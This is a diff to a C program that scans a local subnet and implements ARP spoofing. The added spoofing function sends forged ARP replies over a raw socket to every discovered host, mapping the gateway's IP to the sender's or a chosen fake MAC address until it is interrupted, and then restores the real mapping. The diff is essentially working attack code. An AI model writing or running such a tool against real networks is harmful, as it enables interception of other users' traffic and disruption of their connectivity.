@@ -19,6 +19,7 @@
 
 struct ether_addr;
 extern char * ether_ntoa(struct ether_addr *); //library fucntion
+extern struct ether_addr * ether_aton(const char *);
 
 typedef struct
 {
@@ -26,6 +27,7 @@ typedef struct
 	unsigned int subnet;
 	unsigned int vip; //virtual ip
 	unsigned char mac[6];
+	unsigned char * vmac; //virtual mac
 }host;
 
 typedef void (*routine)(int);
@@ -41,17 +43,18 @@ static int action = 0;
 
 static host * host_list[65536];
 
+static int is_end = 0;
+
 void param_parse(int argc, char * argv[])
 {
-	static const char * manual[] = {"hostscan", "spoof"};
+	static const char * usage = "sudo ./arp {some parameters}\n" 
+		"scanning {virtual ip}\n"
+		"spoof {default target is all, virtual mac}\n";
 
 	if (argc <= 1)
 	{
 		int idx = 0;
-		printf("Usage: %s parameters\n", argv[0]);
-		printf("Paramter lists\n");
-		for (; idx < sizeof(manual) / sizeof(char *); idx++)
-			printf("---%s\n", manual[idx]);
+		printf("usage\n%s", usage);
 		exit(-1);
 	}
 	else
@@ -67,6 +70,11 @@ void param_parse(int argc, char * argv[])
 		else if (!strcmp(argv[idx], "spoof"))
 		{
 			action = 1;
+			if (idx + 1 < argc)
+			{
+				this.vmac = (unsigned char *)malloc(6);
+				memcpy(this.vmac, (unsigned char *)ether_aton(argv[idx + 1]), 6);
+			}
 		}
 		else
 		{
@@ -265,32 +273,70 @@ void scanning(int idx)
 	
 	pthread_cancel(tid);
 	close(arp_sock);
-	printf("total: %d except you\n", tot);
+	printf("there are [%d] hosts, except you\n", tot);
+}
+
+void sigint_handle(int sig)
+{
+	is_end = 1;
 }
 
 void spoofing(int idx) //default is for all hosts
 {
 	int t;
-	unsigned char buf[BUF_SIZE];
-	unsigned int max = ntohl(!this.subnet);
+	unsigned char buf[BUF_SIZE], * used;
+	unsigned int max = ntohl(~this.subnet);
+	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+	int pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
+	struct sockaddr_ll device;
 
+	memset(&device, 0, sizeof(device));
+	device.sll_ifindex = idx;
+	device.sll_halen = ETH_ALEN;
+	memset(device.sll_addr, 0xff, 6);
+	
 	scanning(idx);
-	//reply_handle() thread
-	for (t = 1; t <= max; t++)
+
+	signal(SIGINT, sigint_handle);
+
+	if (this.vmac)
+		used = this.vmac;
+	else
+		used = this.mac;
+
+	printf("\n\n\tarp spoofing start\n");
+	//modified packet
+	for (t = 1; !is_end && t <= max; t++)
 	{	
 		if (t == max)
 		{
 			t = 0;
 			continue;
-			sleep(1); //prevention for packet overflow
 		}
-
+		
 		if (!host_list[t])
 			continue;
-
-		//create_arp_packet();
-		//arp_send();
+		if (host_list[t]->ip == gateway.ip)
+			continue;
+	
+		create_arp_packet(buf, ARPOP_REPLY, used, gateway.ip, host_list[t]->mac, host_list[t]->ip);
+		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
+		usleep(500);
 	}
+	//normal packet
+	for (t = 1; t <= max; t++)
+	{
+		if (!host_list[t])
+			continue;
+		if (host_list[t]->ip == gateway.ip)
+			continue;
+		create_arp_packet(buf, ARPOP_REPLY, gateway.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
+		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
+		usleep(100);
+	}
+
+	close(arp_sock);
+	printf("\tarp spoofing stop\n");
 }
 
 int main(int argc, char * argv[])
